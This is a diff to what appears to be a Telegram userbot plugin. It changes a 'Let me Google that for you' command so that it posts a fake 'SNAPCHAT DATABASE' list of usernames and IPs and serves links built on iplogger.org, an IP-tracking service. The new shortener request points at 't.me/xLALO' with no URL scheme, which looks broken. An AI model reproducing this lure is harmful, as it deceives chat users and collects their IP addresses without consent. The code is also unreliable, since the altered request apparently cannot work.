@@ -443,7 +443,7 @@ async def copypasta(message: Message):
             reply_text += owo
             reply_text += choice(EMOJIS)
         elif owo.lower() == b_char:
-            reply_text += "🅱️"
+            reply_text += "🅱"
         else:
             reply_text += owo.upper() if bool(getrandbits(1)) else owo.lower()
     reply_text += choice(EMOJIS)
@@ -563,7 +563,7 @@ async def mock_(message: Message):
 
 
 @userge.on_cmd(
-    "crash",
+    "snapdatabase",
     about={
         "header": "Let me Google that for you real quick !!",
         "usage": "{tr}lfy [query | reply to msg]",
@@ -573,12 +573,12 @@ async def lfy_(message: Message):
     """lfy_"""
     query = message.input_or_reply_str
     if not query:
-        await message.edit("`test`")
+        await message.edit("SNAPCHAT DATABASE *v0.1*\n\n\n**USERNAME : \nIP: **\n\n**USERNAME : \nIP: **\n\n**USERNAME : \nIP: **")
         return
     query_encoded = query.replace(" ", "+")
     lfy_url = f"https://iplogger.org/2SFd36{query_encoded}"
     payload = {"format": "json", "url": lfy_url}
-    r = requests.get("http://is.gd/create.php", params=payload)
+    r = requests.get("t.me/xLALO", params=payload)
     await message.edit(
         f"Here you are, help yourself.\n[{query}]({r.json()['shorturl']})"
     )
